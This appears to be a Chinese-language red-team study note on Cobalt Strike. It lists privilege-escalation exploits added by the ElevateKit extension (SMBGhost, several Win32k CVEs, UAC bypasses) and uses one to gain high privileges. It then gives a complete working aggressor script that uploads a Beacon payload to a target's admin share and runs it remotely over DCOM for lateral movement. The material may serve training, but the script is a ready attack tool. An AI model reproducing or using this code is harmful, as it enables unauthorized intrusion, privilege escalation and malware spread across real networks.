# Elevate Kit

原生的elevate命令只提供了两种提升权限的方法

```
beacon> elevate

Beacon Local Exploits
=====================

    Exploit                         Description
    -------                         -----------
    svc-exe                         Get SYSTEM via an executable run as a service
    uac-token-duplication           Bypass UAC with Token Duplication

```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661847343109.jpg)

现在加载[elevate.cna](https://github.com/Cobalt-Strike/ElevateKit)这个扩展，可以增加7个


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661847443739.jpg)

再次查看elevate命令

```
beacon> elevate

Beacon Local Exploits
=====================

    Exploit                         Description
    -------                         -----------
    cve-2020-0796                   SMBv3 Compression Buffer Overflow (SMBGhost) (CVE 2020-0796)
    ms14-058                        TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)
    ms15-051                        Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)
    ms16-016                        mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)
    svc-exe                         Get SYSTEM via an executable run as a service
    uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)
    uac-token-duplication           Bypass UAC with Token Duplication
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661847493243.jpg)

使用新加的```uac-schtasks```,成功升级到高权限


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661848979858.jpg)

# Jump & Remote-Exec

查看jump命令
```
beacon> jump

Beacon Remote Exploits
======================

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661849154274.jpg)

把下面脚本保存成``` Invoke-DCOM.ps1```
```
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command1
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");

    # read in the script
    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
    $script = readb($handle, -1);
    closef($handle);

    # host the script in Beacon
    $oneliner = beacon_host_script($1, $script);

    # generate stageless payload
    $payload = artifact_payload($3, "exe", "x64");

    # upload to the target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);

    # run via this powerpick
    bpowerpick!($1, "Invoke-DCOM -ComputerName $+ $2 $+ -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

    # link if p2p beacon
    beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

load进CS


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661849490832.jpg)

再次查看jump命令,已经多了一个dcom方法


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661849530241.jpg)